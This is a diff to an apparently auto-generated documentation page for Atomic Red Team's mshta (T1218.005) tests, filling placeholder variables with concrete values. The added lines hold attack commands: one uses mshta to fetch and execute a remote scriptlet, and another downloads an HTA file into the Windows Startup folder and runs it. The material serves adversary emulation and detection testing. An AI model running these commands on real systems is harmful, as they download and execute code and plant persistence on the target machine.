@@ -999,7 +999,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mshta.exe javascript:a=(GetObject(&#39;script:#{file_url}&#39;)).Exec();close();
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mshta.exe javascript:a=(GetObject(&#39;script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct&#39;)).Exec();close();
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1037,9 +1037,9 @@ Upon execution, a new PowerShell windows will be opened that displays user infor
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="p">=</span><span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;#{hta_url}&quot;</span>
-<span class="nv">$var</span><span class="p">.</span><span class="n">content</span><span class="p">|</span><span class="nb">out-file</span> <span class="s2">&quot;#{temp_file}&quot;</span>
-<span class="n">mshta</span> <span class="s2">&quot;#{temp_file}&quot;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="p">=</span><span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta&quot;</span>
+<span class="nv">$var</span><span class="p">.</span><span class="n">content</span><span class="p">|</span><span class="nb">out-file</span> <span class="s2">&quot;$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta&quot;</span>
+<span class="n">mshta</span> <span class="s2">&quot;$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
